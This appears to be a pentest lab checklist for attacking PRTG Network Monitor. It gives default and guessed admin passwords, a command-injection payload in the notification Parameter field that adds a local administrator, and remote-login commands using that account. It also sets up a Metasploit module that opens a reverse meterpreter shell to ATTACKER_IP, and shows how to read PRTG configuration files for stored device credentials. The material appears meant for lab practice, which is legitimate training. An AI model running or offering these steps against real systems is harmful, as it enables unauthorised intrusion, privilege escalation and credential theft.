# PRTG Network Monitor Labs

> Cross-reference: [[prtg-methodology]]

---

## Lab 1: Notification Command Injection → Admin User Creation

### Objective
Exploit PRTG notification feature to inject OS commands and create a local admin.

### Steps

- [ ] Confirm PRTG is running: `nmap -sV -p 80,443,8080 TARGET`
- [ ] Login with default creds: `prtgadmin:Password123`
  - If changed, try patterns: `PrTg@dmin2019`, `PrTg@dmin2020`, etc.
- [ ] Navigate: Setup → Account Settings → Notifications
- [ ] Click **Add new notification**
- [ ] Scroll down to **Execute Program** section
- [ ] Program File: select `Demo exe notification - outfile.ps1`
- [ ] In **Parameter** field, inject:
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
- [ ] Click **Save**
- [ ] Back in notification list, click the **bell icon** (test/trigger) on your notification
- [ ] Wait ~30 seconds for execution
- [ ] Verify user was created — connect with new admin:
```bash
# evil-winrm
evil-winrm -i TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# psexec
psexec.py 'prtgadm1:Pwn3d_by_PRTG!@TARGET'

# crackmapexec verify
crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```
- [ ] Read flag: `type C:\Users\Administrator\Desktop\flag.txt`

---

## Lab 2: Metasploit PRTG RCE

### Steps

- [ ] Start Metasploit: `msfconsole -q`
- [ ] Load module:
```
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS TARGET
set ADMIN_PASSWORD PrTg@dmin2019
set LHOST ATTACKER_IP
run
```
- [ ] Get meterpreter → `shell` → `whoami` (should be NT AUTHORITY\SYSTEM)

---

## Post-Exploitation

- [ ] Harvest monitored device credentials:
```powershell
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat"
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak"
```
- [ ] Search for SNMP community strings, SSH keys, database passwords in config files
